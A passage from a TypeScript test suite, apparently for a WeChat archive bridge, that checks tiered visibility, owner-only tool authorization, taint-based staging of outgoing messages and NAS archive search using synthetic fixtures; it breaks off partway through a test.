import assert from 'node:assert/strict';
import { existsSync, mkdirSync, mkdtempSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { DatabaseSync } from 'node:sqlite';
import test, { type TestContext } from 'node:test';
import {
  VaultError,
  createDoorGuard,
  createHubService,
  openHubDb,
  type AdminWechatMessage,
  type VaultVisibility,
} from '@local/dsh-hub';
import { adminPrincipal, resolveOwnerId } from '../src/admin.js';
import { AgentBridge } from '../src/agent.js';
import { WechatApprovals } from '../src/approvals.js';
import { Automation, validatePolicy } from '../src/automation.js';
import { Store } from '../src/core.js';
import {
  DEFAULT_NAS_ARCHIVE_URL,
  MAX_NAS_SEARCH_LIMIT,
  OWNER_GROUP_CROSS_READ_TOOLS,
  WXARC_PROACTIVE_SEND_TOOL,
  WxarcBridgeSecurityError,
  apply,
  assertOwnerToolAuthorized,
  createNasVaultProvider,
  createWechatSendSink,
  createWechatTargetDirectoryProvider,
  createWechatVaultProvider,
  isOwnerGroupAtMentionTurn,
  listNasSessions,
  registerWechatSendTool,
  resolveNasSessions,
  resolveWechatVaultCircle,
  searchNasArchive,
} from '../src/index.js';
import type { WechatToolDefinition } from '../src/send-sink.js';

const OWNER_SOURCE_KEY = 'b'.repeat(64);
const signal = () => new AbortController().signal;

function createTestHub(t: TestContext) {
  const db = openHubDb({ inMemory: true });
  t.after(() => db.close());
  const guard = createDoorGuard();
  const hub = createHubService({}, { db, guard });
  return hub;
}

test('VaultProvider(wechat): enforces 4-tier visibility, unlabeled defaults to owner_private, compact <=200 snippet, and context expansion', async (t) => {
  const dir = mkdtempSync(join(tmpdir(), 'wxarc-vault-wx-'));
  t.after(() => rmSync(dir, { recursive: true, force: true }));
  const store = new Store(dir);
  t.after(() => store.close());

  const longBody = '发布计划确认 ' + '长文内容'.repeat(80);
  store.commit(
    'text',
    0,
    [
      { id: 1, kind: 'text', session: 'ext@chatroom', session_name: '公开交流群', sender: '路人甲', text: '发布计划确认 公开讨论', ts: 1700000001, local_type: 1 },
      { id: 2, kind: 'text', session: 'work@chatroom', session_name: '研发项目群', sender: '同事A', text: '上一条工作上下文', ts: 1700000002, local_type: 1 },
      { id: 3, kind: 'text', session: 'work@chatroom', session_name: '研发项目群', sender: '同事A', text: longBody, ts: 1700000003, local_type: 1 },
      { id: 4, kind: 'text', session: 'work@chatroom', session_name: '研发项目群', sender: '同事B', text: '下一条工作上下文', ts: 1700000004, local_type: 1 },
      { id: 5, kind: 'text', session: 'family@chatroom', session_name: '家庭小群', sender: '家人', text: '发布计划确认 家庭聚餐', ts: 1700000005, local_type: 1 },
      { id: 6, kind: 'text', session: 'unlabeled_dm', session_name: '未标注私聊', sender: '好友', text: '发布计划确认 私密备注', ts: 1700000006, local_type: 1 },
    ],
    1000,
  );

  const circles: Record<string, VaultVisibility> = {
    'ext@chatroom': 'external',
    'work@chatroom': 'work',
    'family@chatroom': 'family',
  };
  const wardrobe = {
    resolveVaultVisibility: (roomKey: string): VaultVisibility => circles[roomKey] ?? 'owner_private',
  };

  assert.equal(resolveWechatVaultCircle('unlabeled_dm', wardrobe), 'owner_private');
  assert.equal(resolveWechatVaultCircle('ext@chatroom', null), 'owner_private');

  const hub = createTestHub(t);
  hub.registerVaultProvider(createWechatVaultProvider({ db: store.db, getWardrobe: () => wardrobe }));

  hub.registerSessionPrincipal({ sessionId: 'ext-chat', role: 'external_chat', tier: 0, trustLevel: 'untrusted', boundRoomKey: 'ext@chatroom' });
  hub.registerSessionPrincipal({ sessionId: 'pr-public', role: 'worker', tier: 1, trustLevel: 'untrusted' });
  hub.registerSessionPrincipal({ sessionId: 'pr-work', role: 'worker', tier: 2, trustLevel: 'triage' });
  hub.registerSessionPrincipal({ sessionId: 'owner-main', role: 'owner_session', tier: 3, trustLevel: 'owner' });

  await assert.rejects(
    () => hub.vault.search({ query: '发布计划确认' }, { agent: { id: 'ext-chat' } }),
    (err: unknown) => err instanceof VaultError && err.code === 'VAULT_FORBIDDEN',
  );

  const tier1 = await hub.vault.search({ query: '发布计划确认' }, { agent: { id: 'pr-public' } });
  assert.deepEqual(tier1.hits.map((h) => h.roomKey), ['wechat:ext@chatroom']);

  const tier2 = await hub.vault.search({ query: '发布计划确认' }, { agent: { id: 'pr-work' } });
  assert.deepEqual(tier2.hits.map((h) => h.circle).sort(), ['external', 'work']);
  const workHit = tier2.hits.find((h) => h.roomKey === 'wechat:work@chatroom')!;
  assert.ok(workHit.snippet.length <= 200);
  assert.equal(workHit.snippet.includes('\n'), false);

  const tier3 = await hub.vault.search({ query: '发布计划确认' }, { agent: { id: 'owner-main' } });
  assert.equal(tier3.hits.length, 4);
  const unlabeledHit = tier3.hits.find((h) => h.roomKey === 'wechat:unlabeled_dm')!;
  assert.equal(unlabeledHit.circle, 'owner_private');

  const ctxWork = await hub.vault.context('wechat', workHit.itemId, { before: 1, after: 1 }, { agent: { id: 'pr-work' } });
  assert.equal(ctxWork.result?.items.length, 3);
  assert.equal(ctxWork.result?.items[0].text, '上一条工作上下文');
  assert.equal(ctxWork.result?.items[1].isTarget, true);
  assert.equal(ctxWork.result?.items[2].text, '下一条工作上下文');

  const deniedCtx = await hub.vault.context('wechat', unlabeledHit.itemId, { before: 1, after: 1 }, { agent: { id: 'pr-work' } });
  assert.equal(deniedCtx.result, null);
});

test('VaultProvider(wechat): supports roomKey exact matching and empty-query reverse-chronological browsing', async (t) => {
  const dir = mkdtempSync(join(tmpdir(), 'wxarc-vault-roomkey-'));
  t.after(() => rmSync(dir, { recursive: true, force: true }));
  const store = new Store(dir);
  t.after(() => store.close());

  store.commit(
    'text',
    0,
    [
      { id: 1, kind: 'text', session: 'ext@chatroom', session_name: '公开群', sender: '路人', text: '公开第一条', ts: 1700001001, local_type: 1 },
      { id: 2, kind: 'text', session: 'wxid_owner_dm', session_name: '主人私聊', sender: '主人', text: '私聊第一条', ts: 1700001002, local_type: 1 },
      { id: 3, kind: 'text', session: 'wxid_owner_dm', session_name: '主人私聊', sender: '主人', text: '   ', ts: 1700001003, local_type: 1 },
      { id: 4, kind: 'text', session: 'wxid_owner_dm_other', session_name: '其他私聊', sender: '朋友', text: '前缀相似但不是同一会话', ts: 1700001004, local_type: 1 },
      { id: 5, kind: 'text', session: 'wxid_owner_dm', session_name: '主人私聊', sender: '助理', text: '私聊最新一条', ts: 1700001005, local_type: 1 },
    ],
    1000,
  );

  const wardrobe = {
    resolveVaultVisibility: (roomKey: string): VaultVisibility =>
      roomKey === 'ext@chatroom' ? 'external' : 'owner_private',
  };

  const hub = createTestHub(t);
  hub.registerVaultProvider(createWechatVaultProvider({ db: store.db, getWardrobe: () => wardrobe }));
  hub.registerSessionPrincipal({ sessionId: 'tier1-worker', role: 'worker', tier: 1, trustLevel: 'untrusted' });
  hub.registerSessionPrincipal({ sessionId: 'owner-main', role: 'owner_session', tier: 3, trustLevel: 'owner' });

  const recentAll = await hub.vault.search(
    { query: '', sources: ['wechat'], limit: 10 },
    { agent: { id: 'owner-main' } },
  );
  assert.deepEqual(
    recentAll.hits.map((h) => h.snippet),
    ['私聊最新一条', '前缀相似但不是同一会话', '私聊第一条', '公开第一条'],
  );

  const ownerDmPrefixed = await hub.vault.search(
    { query: '', sources: ['wechat'], roomKey: 'wechat:wxid_owner_dm', limit: 10 },
    { agent: { id: 'owner-main' } },
  );
  assert.deepEqual(
    ownerDmPrefixed.hits.map((h) => h.snippet),
    ['私聊最新一条', '私聊第一条'],
  );

  const ownerDmBare = await hub.vault.search(
    { sources: ['wechat'], roomKey: '  WXID_OWNER_DM  ', limit: 10 },
    { agent: { id: 'owner-main' } },
  );
  assert.deepEqual(
    ownerDmBare.hits.map((h) => h.snippet),
    ['私聊最新一条', '私聊第一条'],
  );

  const tier1Blocked = await hub.vault.search(
    { query: '', sources: ['wechat'], roomKey: 'wechat:wxid_owner_dm', limit: 10 },
    { agent: { id: 'tier1-worker' } },
  );
  assert.equal(tier1Blocked.hits.length, 0);
});

test('VaultProvider(nas) & nas-search: no hardcoded LAN IP, 4-tier filtering, unlabeled->owner_private, and context', async (t) => {
  assert.equal(DEFAULT_NAS_ARCHIVE_URL, '');
  await assert.rejects(
    () => searchNasArchive({ query: '历史' }),
    (err: unknown) => err instanceof WxarcBridgeSecurityError && err.code === 'EMPTY_NAS_URL',
  );

  const dir = mkdtempSync(join(tmpdir(), 'wxarc-vault-nas-'));
  t.after(() => rmSync(dir, { recursive: true, force: true }));
  const dbPath = join(dir, 'nas.sqlite');
  const db = new DatabaseSync(dbPath);
  db.exec('CREATE TABLE messages(id INTEGER PRIMARY KEY, session TEXT, session_name TEXT, sender TEXT, sender_id TEXT, text TEXT, ts INTEGER)');
  db.prepare('INSERT INTO messages VALUES (?,?,?,?,?,?,?)').run(1, 'work@chatroom', '项目群', '同事', 'wxid_colleague', '部署前检查项', 1700001001);
  db.prepare('INSERT INTO messages VALUES (?,?,?,?,?,?,?)').run(2, 'work@chatroom', '项目群', '同事', 'wxid_colleague', '里程碑验收 ' + '细节'.repeat(150), 1700001002);
  db.prepare('INSERT INTO messages VALUES (?,?,?,?,?,?,?)').run(3, 'work@chatroom', '项目群', '同事', 'wxid_colleague', '部署后回访', 1700001003);
  db.prepare('INSERT INTO messages VALUES (?,?,?,?,?,?,?)').run(4, 'unlabeled_chat', '私人聊天', '朋友', 'wxid_friend', '里程碑验收 私人记录', 1700001004);
  db.close();

  const hub = createTestHub(t);
  const wardrobe = {
    resolveVaultVisibility: (roomKey: string): VaultVisibility =>
      roomKey === 'work@chatroom' ? 'work' : 'owner_private',
  };
  let configuredPath = '';
  hub.registerVaultProvider(
    createNasVaultProvider({
      getConfig: () => ({ baseUrl: '', archivePath: configuredPath }),
      getWardrobe: () => wardrobe,
    }),
  );

  hub.registerSessionPrincipal({ sessionId: 'worker-t2', role: 'worker', tier: 2, trustLevel: 'triage' });
  hub.registerSessionPrincipal({ sessionId: 'owner-t3', role: 'owner_session', tier: 3, trustLevel: 'owner' });

  const unconfigured = await hub.vault.search({ query: '里程碑验收', sources: ['nas'] }, { agent: { id: 'owner-t3' } });
  assert.equal(unconfigured.total, 0);

  configuredPath = dbPath;
  const t2 = await hub.vault.search({ query: '里程碑验收', sources: ['nas'] }, { agent: { id: 'worker-t2' } });
  assert.equal(t2.hits.length, 1);
  assert.equal(t2.hits[0].circle, 'work');
  assert.ok(t2.hits[0].snippet.length <= 200);

  const t3 = await hub.vault.search({ query: '里程碑验收', sources: ['nas'] }, { agent: { id: 'owner-t3' } });
  assert.equal(t3.hits.length, 2);
  const privHit = t3.hits.find((h) => h.roomKey === 'wechat:unlabeled_chat')!;
  assert.equal(privHit.circle, 'owner_private');

  const workCtx = await hub.vault.context('nas', t2.hits[0].itemId, { before: 1, after: 1 }, { agent: { id: 'worker-t2' } });
  assert.equal(workCtx.result?.items.length, 3);
  assert.equal(workCtx.result?.items[1].isTarget, true);

  const blockedCtx = await hub.vault.context('nas', privHit.itemId, { before: 1, after: 1 }, { agent: { id: 'worker-t2' } });
  assert.equal(blockedCtx.result, null);
});

test('TargetDirectoryProvider registers into Hub and resolves/lists rooms', async (t) => {
  const dir = mkdtempSync(join(tmpdir(), 'wxarc-target-dir-'));
  t.after(() => rmSync(dir, { recursive: true, force: true }));
  const store = new Store(dir);
  t.after(() => store.close());

  const hub = createTestHub(t);
  hub.registerTargetDirectory(
    createWechatTargetDirectoryProvider(
      () => ({
        db: store.db,
        rules: [
          { kind: 'text', sourceId: 'proj@chatroom', title: '核心研发群' },
          { kind: 'text', sourceId: 'wxid_demo_peer', title: '测试联系人' },
        ],
      }),
      () => ({
        resolveVaultVisibility: (room: string): VaultVisibility =>
          room === 'proj@chatroom' ? 'work' : 'owner_private',
      }),
    ),
  );

  const resolved = await hub.resolveTarget({ targetName: '核心研发群' });
  assert.equal(resolved.status, 'matched');
  assert.equal(resolved.target?.chatId, 'proj@chatroom');
  assert.equal(resolved.target?.circle, 'work');

  const listed = await hub.listTargets({ source: 'wechat', kind: 'group' });
  assert.equal(listed.length, 1);
  assert.equal(listed[0].roomKey, 'wechat:proj@chatroom');
});

test('Tool auth lockdown: wxarc_messages/status/targets/nas_search & wxarc_proactive_send enforce Hub SessionPrincipal and DoorGuard taint', async (t) => {
  const dir = mkdtempSync(join(tmpdir(), 'wxarc-auth-lock-'));
  t.after(() => rmSync(dir, { recursive: true, force: true }));
  const hub = createTestHub(t);
  const disposers: Array<() => unknown> = [];
  const tools = new Map<string, Record<string, any>>();

  const ctx: any = {
    hub,
    watcher: hub,
    on: () => () => {},
    provide: () => {},
    systemPrompt: { section: () => () => {} },
    agents: { get: () => undefined },
    connection: { requestRejection: () => undefined },
    webServer: { host: '127.0.0.1', port: 19999, register: () => () => {} },
    effect: (fn: () => () => unknown) => disposers.push(fn()),
    inject: (keys: string[], fn: (child: any) => void) => {
      if (keys.includes('tools')) {
        fn({
          effect: (ef: () => () => unknown) => disposers.push(ef()),
          tools: {
            register: (def: Record<string, any>) => {
              tools.set(def.name, def);
              return () => tools.delete(def.name);
            },
          },
        });
      }
      if (keys.includes('hub')) {
        fn({
          hub,
          watcher: hub,
          effect: (ef: () => () => unknown) => disposers.push(ef()),
          tools: {
            register: (def: Record<string, any>) => {
              tools.set(def.name, def);
              return () => tools.delete(def.name);
            },
          },
        });
      }
    },
    logger: { info() {}, warn() {} },
  };

  t.after(async () => {
    for (const d of disposers.reverse()) {
      await d();
    }
  });

  const nasPath = join(dir, 'nas-auth.sqlite');
  const nasDb = new DatabaseSync(nasPath);
  nasDb.exec('CREATE TABLE messages(id INTEGER PRIMARY KEY, session TEXT, session_name TEXT, sender TEXT, sender_id TEXT, text TEXT, ts INTEGER)');
  nasDb.prepare('INSERT INTO messages VALUES (?,?,?,?,?,?,?)').run(1, 'work@chatroom', '项目群', '同事', 'wxid_col', '验证查档', 1700002000);
  nasDb.close();

  apply(ctx, {
    stateDir: dir,
    url: 'http://127.0.0.1:1',
    pollMs: 3000,
    retain: 1000,
    nasArchivePath: nasPath,
    defaultNotifyTarget: 'filehelper',
    allowedTargets: ['filehelper', 'group@chatroom'],
    requireApprovalByDefault: false,
  });

  hub.registerSessionPrincipal({ sessionId: 'ext-1', role: 'external_chat', tier: 0, trustLevel: 'untrusted', boundRoomKey: 'group@chatroom' });
  hub.registerSessionPrincipal({ sessionId: 'worker-2', role: 'worker', tier: 2, trustLevel: 'triage' });
  hub.registerSessionPrincipal({ sessionId: 'owner-3', role: 'owner_session', tier: 3, trustLevel: 'owner' });

  const isOwnerForbidden = (err: unknown): boolean =>
    err instanceof WxarcBridgeSecurityError &&
    (err.code === 'OWNER_TOOL_FORBIDDEN' || err.code === 'NAS_SEARCH_FORBIDDEN');

  for (const [name, args] of [
    ['wxarc_status', {}],
    ['wxarc_messages', {}],
    ['wxarc_targets', {}],
    ['wxarc_nas_search', { query: '验证查档' }],
  ] as const) {
    const tool = tools.get(name)!;
    await assert.rejects(() => tool.execute(args), isOwnerForbidden);
    await assert.rejects(
      () => tool.execute(args, { agent: { id: 'ext-1', session: { header: { delegationDepth: 0 } } } }),
      isOwnerForbidden,
    );
    await assert.rejects(
      () => tool.execute(args, { agent: { id: 'worker-2', session: { header: { delegationDepth: 0 } } } }),
      isOwnerForbidden,
    );
    await assert.rejects(
      () =>
        tool.execute(
          args,
          { agent: { id: 'sub-1', session: { header: { delegationDepth: 1, parentSession: 'owner-3', origin: 'subagent' } } } },
        ),
      isOwnerForbidden,
    );
    const ownerRes = await tool.execute(args, { agent: { id: 'owner-3', session: { header: { delegationDepth: 0 } } } });
    assert.ok(ownerRes);
    const webRes = await tool.execute(args, { agent: { id: 'web-interactive-1', session: { header: { delegationDepth: 0 } } } });
    assert.ok(webRes);
  }

  const sink = createWechatSendSink({
    transport: {
      send: async () => ({ status: 'sent', deliveryId: 'del-1' }),
      recentMessages: async () => [],
      getAtmosphere: async ({ chatId }) => ({
        chatId,
        healthy: true,
        paused: false,
        messageCount: 0,
        lastMessageAt: null,
        secondsSinceLastMessage: null,
        ownSpokeSince: false,
        quiet: true,
        recentMessages: [],
      }),
      status: async () => ({ ok: true, mode: 'cordis', healthy: true }),
    },
    config: {
      allowedTargets: ['filehelper', 'group@chatroom'],
      requireApprovalByDefault: false,
    },
    db: hub.db,
  });
  hub.registerSink(sink);

  const sendTools = new Map<string, WechatToolDefinition>();
  registerWechatSendTool(
    {
      hub,
      tools: {
        register: (def) => {
          sendTools.set(def.name, def);
          return () => sendTools.delete(def.name);
        },
      },
    },
    { config: { defaultNotifyTarget: 'filehelper', allowedTargets: ['filehelper', 'group@chatroom'], requireApprovalByDefault: false } },
  );
  const sendTool = sendTools.get(WXARC_PROACTIVE_SEND_TOOL)!;

  await assert.rejects(
    () => sendTool.execute({ chatId: 'filehelper', text: 'nope' }, { agent: { id: 'worker-2', session: { header: { delegationDepth: 0 } } } }),
    /tier-3/,
  );

  const crossGroup = await sendTool.execute(
    { chatId: 'group@chatroom', text: '跨群必须进草稿', idempotencyKey: 'cross-group-1' },
    { agent: { id: 'owner-3', session: { header: { delegationDepth: 0 } } } },
  );
  assert.equal(crossGroup.status, 'staged');

  hub.markSessionTainted('owner-3', 'read_private');
  const taintedSend = await sendTool.execute(
    { chatId: 'filehelper', text: '污点必须进草稿', idempotencyKey: 'tainted-1' },
    { agent: { id: 'owner-3', session: { header: { delegationDepth: 0 } } } },
  );
  assert.equal(taintedSend.status, 'staged');
});

test('AgentBridge: registers external dsh_conversations as tier 0, downgrades legacy wxarc_admin_sessions while preserving disk dir when Router manages admin', async (t) => {
  const dir = mkdtempSync(join(tmpdir(), 'wxarc-thin-admin-'));
  const store = new Store(dir);
  const hub = createTestHub(t);

  const legacyDir = join(dir, 'work', 'legacy-admin-key');
  mkdirSync(legacyDir, { recursive: true });
  writeFileSync(join(legacyDir, 'notes.txt'), 'keep me read-only\n');

  const presets = new Map<unknown, string>();
  const agents = new Map<string, any>();
  const makeAgent = (id: string, cwd: string) => {
    const a = {
      id,
      cwd,
      session: { header: { delegationDepth: 0, origin: 'user' } },
      inbox: { clear() {} },
      model: { select() {} },
      whenIdle: async () => {},
      cancel() {},
    };
    agents.set(id, a);
    return a;
  };
  const legacyAgent = makeAgent('sess-legacy-admin', legacyDir);
  presets.set(legacyAgent.session, 'danger-full-access');

  const ctx: any = {
    on: () => () => {},
    systemPrompt: { section: () => () => {} },
    agents: { get: (id: string) => agents.get(id) },
    approval: { setPolicy() {} },
    permissionPresets: {
      permissionState: (s: unknown) => ({ sandbox: presets.get(s), approval: 'ask' }),
      set: (s: unknown, mode: string) => presets.set(s, mode),
    },
    llm: {
      resolveCallConfig: async () => ({}),
      resolveModelInfo: async () => ({ inputModalities: ['text'] }),
    },
    workspaceController: { create: async () => ({ created: false, workspace: { workspaceId: 'ws' } }) },
    workspaceRegistry: { get: () => ({ attachSession: async () => {} }) },
    sessionController: {
      resolveAgent: async (id: string) =>
        agents.has(id) ? { agent: agents.get(id) } : { error: { code: 'session/not-found' } },
      create: async ({ sessionId, cwd }: { sessionId: string; cwd: string }) => {
        makeAgent(sessionId, cwd);
        return { sessionId };
      },
      rename: async () => {},
      state: async () => ({ running: false, queue: [], pendingInput: [] }),
      prompt: async () => {},
    },
  };

  const bridge = new AgentBridge(ctx, store, {
    root: join(dir, 'work'),
    personas: { context: () => ({ name: '助手', memory: [] }) },
    hub,
    isRouterManagedAdmin: () => true,
    settings: () => ({
      revision: 1,
      policy: { ownId: 'wxid_bot', controllerId: 'wxid_owner', adminIds: [] },
    }),
  });
  t.after(async () => {
    await bridge.close();
    store.close();
    rmSync(dir, { recursive: true, force: true });
  });

  store.db
    .prepare('INSERT INTO dsh_conversations VALUES (?,?,?,?,?,?,?)')
    .run(
      'legacy-admin-key',
      'sess-legacy-admin',
      '微信 · 主人 · 助手',
      legacyDir,
      null,
      JSON.stringify({
        policy: { ownId: 'wxid_bot', controllerId: 'wxid_owner' },
        event: { kind: 'text', session: 'wxid_owner', senderId: 'wxid_owner', sourceKey: OWNER_SOURCE_KEY },
      }),
      Date.now(),
    );
  store.db.prepare('INSERT INTO wxarc_admin_sessions VALUES (?)').run('sess-legacy-admin');

  await bridge.refreshAdminWorkspaces();

  assert.equal(presets.get(legacyAgent.session), 'workspace-write');
  assert.equal(
    store.db.prepare('SELECT 1 FROM wxarc_admin_sessions WHERE session_id=?').get('sess-legacy-admin'),
    undefined,
  );
  assert.equal(existsSync(join(legacyDir, 'notes.txt')), true);

  const row = await bridge.ensure(
    { kind: 'text', session: 'ext_group@chatroom', senderId: 'wxid_stranger', sourceKey: OWNER_SOURCE_KEY },
    { title: '外部群' },
    { ownId: 'wxid_bot', controllerId: 'wxid_owner', provider: 'p', model: 'm' },
    signal(),
  );
  const principal = hub.getSessionPrincipal(row.session_id);
  assert.equal(principal?.role, 'external_chat');
  assert.equal(principal?.tier, 0);
  assert.equal(principal?.trustLevel, 'untrusted');
  assert.equal(principal?.boundRoomKey, 'ext_group@chatroom');
});

test('Single-owner controllerId convergence, legacy adminIds[0] fallback, approval deferral to Router, and non-blocking multimodal pass-through', async (t) => {
  assert.throws(
    () =>
      validatePolicy({
        enabled: false,
        adminIds: ['wxid_one', 'wxid_two'],
      }),
    /单一主人/,
  );

  const legacyPolicy = { ownId: 'wxid_bot', controllerId: '', adminIds: ['wxid_legacy'] };
  assert.equal(resolveOwnerId(legacyPolicy), 'wxid_legacy');
  assert.equal(
    adminPrincipal(
      { kind: 'text', session: 'wxid_legacy', senderId: 'wxid_legacy', sourceKey: OWNER_SOURCE_KEY },
      legacyPolicy,
    ),
    'wxid_legacy',
  );
  assert.equal(
    resolveOwnerId({ ownId: 'wxid_bot', controllerId: 'wxid_primary', adminIds: ['wxid_legacy'] }),
    'wxid_primary',
  );

  const dir = mkdtempSync(join(tmpdir(), 'wxarc-multimodal-admin-'));
  t.after(() => rmSync(dir, { recursive: true, force: true }));
  const store = new Store(dir);
  t.after(() => store.close());

  const imgPath = join(dir, 'shot.png');
  const wavPath = join(dir, 'voice.wav');
  const posterPath = join(dir, 'poster.jpg');
  writeFileSync(imgPath, 'img');
  writeFileSync(wavPath, 'wav');
  writeFileSync(posterPath, 'jpg');

  const nowMs = 1_700_000_000_000;
  const nowSec = Math.floor(nowMs / 1000);
  const received: AdminWechatMessage[] = [];
  let approvalConsumed = false;

  const auto = new Automation({
    store,
    listener: { status: () => ({ healthy: true }), wechatRoot: '/data/wxid_bot_abcd' },
    cua: { prepare: async () => async () => ({ confirmed: true }) },
    wxarcHome: dir,
    now: () => nowMs,
    resolveSource: (_h, e) => ({
      ...e,
      senderId: e.sender,
      sourceKey: OWNER_SOURCE_KEY,
      account: '/data/wxid_bot_abcd/db_storage',
    }),
    enrich: async (ev) => {
      await new Promise((r) => setTimeout(r, 180));
      const baseType = (ev.local_type ?? 0) % 4294967296;
      if (baseType === 3) {
        return { ...ev, image: { path: imgPath, status: 'read', hash: 'h1', mediaType: 'image/png', bytes: 3, source: 'test' } };
      }
      if (baseType === 34) {
        return { ...ev, voice: { kind: 'voice', status: 'transcribed', transcript: '帮我查下刚才那个 PR', wavPath } };
      }
      if (baseType === 43) {
        return {
          ...ev,
          video: {
            kind: 'video',
            status: 'ready',
            poster: { path: posterPath, status: 'read', hash: 'h2', mediaType: 'image/jpeg', bytes: 3, source: 'test' },
            transcript: '视频里的演示步骤',
          },
        };
      }
      if (baseType === 49) {
        return {
          ...ev,
          article: { status: 'read', title: '架构周报', text: '这是文章正文摘要内容。'.repeat(20) },
        };
      }
      return ev;
    },
  });
  t.after(() => auto.close());

  const approvals = new WechatApprovals(store, () => auto.settings());
  t.after(() => approvals.close());
  const origConsume = approvals.consume.bind(approvals);
  approvals.consume = (ev) => {
    const res = origConsume(ev);
    if (res) approvalConsumed = true;
    return res;
  };
  auto.approvals = approvals;

  auto.save(
    {
      ...auto.settings().policy,
      enabled: true,
      allChats: false,
      mode: 'send',
      provider: 'test',
      model: 'test',
      ownId: 'wxid_bot',
      controllerId: 'wxid_owner',
      instructions: '自然回复',
      rules: [{ kind: 'text', sourceId: 'filehelper', title: '文件助手', search: '文件助手', wechatId: '' }],
    },
    0,
  );

  auto.setAdminWechatHandler(async (msg) => {
    received.push(msg);
    return { handled: true };
  });

  store.commit(
    'text',
    0,
    [
      { id: 1, kind: 'text', session: 'wxid_owner', sender: 'wxid_owner', text: '确认', ts: nowSec - 5, local_type: 1 },
      { id: 2, kind: 'text', session: 'wxid_owner', sender: 'wxid_owner', text: '[图片]', ts: nowSec - 4, local_type: 3 },
      { id: 3, kind: 'text', session: 'wxid_owner', sender: 'wxid_owner', text: '', ts: nowSec - 3, local_type: 34 },
      { id: 4, kind: 'text', session: 'wxid_owner', sender: 'wxid_owner', text: '', ts: nowSec - 2, local_type: 43 },
      { id: 5, kind: 'text', session: 'wxid_owner', sender: 'wxid_owner', text: '[链接] 架构周报', ts: nowSec - 1, local_type: 49 },
    ],
    1000,
  );

  const startMs = Date.now();
  await auto.collect();
  const elapsedMs = Date.now() - startMs;

  assert.equal(approvalConsumed, false);
  assert.ok(elapsedMs < 140, `collect() blocked on multimodal enrichment (${elapsedMs}ms)`);
  assert.equal(auto.settings().cursor, 5);
  assert.equal(received.length, 1);
  assert.equal(received[0].text, '确认');

  await new Promise((r) => setTimeout(r, 320));
  assert.equal(received.length, 5);

  const imgMsg = received.find((m) => m.localType === 3)!;
  assert.equal(imgMsg.imagePath, imgPath);
  assert.deepEqual(imgMsg.mediaPaths, [imgPath]);

  const voiceMsg = received.find((m) => m.localType === 34)!;
  assert.equal(voiceMsg.voiceTranscript, '帮我查下刚才那个 PR');
  assert.deepEqual(voiceMsg.mediaPaths, [wavPath]);

  const videoMsg = received.find((m) => m.localType === 43)!;
  assert.equal(videoMsg.imagePath, posterPath);
  assert.equal(videoMsg.voiceTranscript, '视频里的演示步骤');

  const articleMsg = received.find((m) => m.localType === 49)!;
  assert.match(articleMsg.articleSummary || '', /架构周报/);
});

test('NAS archive search & VaultProvider(nas): fuzzy session resolution with 60s cache, empty-query time pagination, no-match isolation, and local archive filtering', async (t) => {
  assert.equal(MAX_NAS_SEARCH_LIMIT, 50);
  await assert.rejects(() => searchNasArchive({}), TypeError);

  const nasDir = mkdtempSync(join(tmpdir(), 'wxarc-nas-fuzzy-'));
  t.after(() => rmSync(nasDir, { recursive: true, force: true }));
  writeFileSync(join(nasDir, '访问密码.txt'), '访问密码：dummy-pass-123\n');

  const sessionsPayload = [
    { session: '990001@chatroom', name: '测试星球群', count: 120, last_ts: 1764244800 },
    { session: '990002@chatroom', name: '虚拟闲聊群', count: 80, last_ts: 1764244000 },
    { session: 'wxid_demo_peer', name: '测试好友', count: 30, last_ts: 1764243000 },
  ];

  const resolvedDirect = resolveNasSessions(
    sessionsPayload.map((s) => ({ session: s.session, name: s.name, count: s.count, lastTs: s.last_ts })),
    '测试 星球群',
  );
  assert.equal(resolvedDirect.length, 1);
  assert.equal(resolvedDirect[0].session, '990001@chatroom');

  let sessionsFetches = 0;
  const messageRequests: string[] = [];
  const tNov28 = Math.floor(Date.parse('2026-11-28T09:00:00+08:00') / 1000);
  const tNov27Late = Math.floor(Date.parse('2026-11-27T20:30:00+08:00') / 1000);
  const tNov27Mid = Math.floor(Date.parse('2026-11-27T14:15:00+08:00') / 1000);
  const tNov26 = Math.floor(Date.parse('2026-11-26T18:00:00+08:00') / 1000);

  const mockFetcher = async (url: string) => {
    if (url.endsWith('/api/login')) {
      return {
        status: 200,
        ok: true,
        headers: { get: (k: string) => (k.toLowerCase() === 'set-cookie' ? 'sid=ok; Path=/' : null) },
        json: async () => ({ ok: true }),
      };
    }
    if (url.endsWith('/api/sessions')) {
      sessionsFetches += 1;
      return {
        status: 200,
        ok: true,
        text: async () => JSON.stringify(sessionsPayload),
        json: async () => sessionsPayload,
      };
    }
    if (url.includes('/api/messages')) {
      messageRequests.push(url);
      const parsed = new URL(url);
      const sessionParam = parsed.searchParams.get('session');
      const beforeParam = parsed.searchParams.get('before');
      assert.equal(sessionParam, '990001@chatroom');
      if (!beforeParam) {
        const page1 = {
          messages: [
            { id: 301, session: '990001@chatroom', sender: '成员甲', text: '今天早上的新话题', ts: tNov28 },
            { id: 300, session: '990001@chatroom', sender: '成员乙', text: '昨天晚上讨论了旅行计划', ts: tNov27Late },
          ],
          next: 'cursor-page-2',
        };
        return { status: 200, ok: true, text: async () => JSON.stringify(page1), json: async () => page1 };
      }
      if (beforeParam === 'cursor-page-2') {
        const page2 = {
          messages: [
            { id: 299, session: '990001@chatroom', sender: '成员丙', text: '昨天下午定了周末出发时间', ts: tNov27Mid },
            { id: 298, session: '990001@chatroom', sender: '成员甲', text: '前天的旧消息不应返回', ts: tNov26 },
          ],
          next: 'cursor-page-3',
        };
        return { status: 200, ok: true, text: async () => JSON.stringify(page2), json: async () => page2 };
      }
      throw new Error('Should have stopped paginating after seeing items older than since');
    }
    throw new Error(`Unexpected URL: ${url}`);
  };

  const paged = await searchNasArchive(
    {
      session: '测试 星球群',
      since: '2026-11-27',
      until: '2026-11-27',
      limit: 20,
    },
    { baseUrl: 'http://198.51.100.20:28787', archivePath: nasDir, fetcher: mockFetcher },
  );
  assert.equal(sessionsFetches, 1);
  assert.equal(messageRequests.length, 2);
  assert.match(messageRequests[0], /session=990001%40chatroom/);
  assert.match(messageRequests[1], /before=cursor-page-2/);
  assert.equal(paged.count, 2);
  assert.deepEqual(
    paged.items.map((item) => item.text),
    ['昨天晚上讨论了旅行计划', '昨天下午定了周末出发时间'],
  );
  assert.equal(paged.items[0].sessionName, '测试星球群');

  const noMatch = await searchNasArchive(
    { session: '完全不存在的群聊名', since: '2026-11-27' },
